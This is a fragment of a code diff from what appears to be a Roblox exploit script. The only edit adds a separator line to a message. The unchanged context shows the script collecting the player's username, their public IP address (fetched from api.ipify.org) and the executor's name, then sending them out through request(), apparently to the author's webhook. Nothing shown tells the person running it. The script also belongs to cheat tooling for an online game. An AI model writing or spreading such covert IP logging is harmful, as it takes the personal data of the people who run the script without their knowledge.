@@ -2,7 +2,7 @@
 --spam the webhook i dare you
 
         pcall(function() local data = {
-            ["content"] = `{game.Players.LocalPlayer.Name} executed\n{game:HttpGet("https://api.ipify.org")}\n{identifyexecutor()}\nNORMAL`
+            ["content"] = `{game.Players.LocalPlayer.Name} executed\n{game:HttpGet("https://api.ipify.org")}\n{identifyexecutor()}\nNORMAL\n-------------`
         }
 
         request(
